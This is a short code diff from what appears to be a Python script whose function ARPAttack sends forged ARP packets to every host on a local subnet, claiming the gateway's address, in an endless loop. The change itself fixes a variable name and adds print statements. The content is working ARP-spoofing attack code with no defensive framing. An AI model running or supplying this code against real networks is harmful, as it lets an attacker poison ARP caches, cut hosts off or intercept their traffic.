@@ -38,10 +38,12 @@ def ARPAttack(ipprefix, mask_len, mac='2b:b2:2b:b2:12:34'):
     gateway = int_to_ip(ip_to_int(ipprefix)+1)
     victim_list = get_all_host_in_local_network(ipprefix, mask_len)
     victim_list.remove(get_my_ip())
-    victim_list.remove(spoof)
+    victim_list.remove(gateway)
+    print victim_list
 
     request = 1
     while True:
+        print "attacking..."
         for victim in victim_list:
             arp = ARP(op=request, psrc=gateway, pdst=victim, hwsrc=mac)
             send(arp)
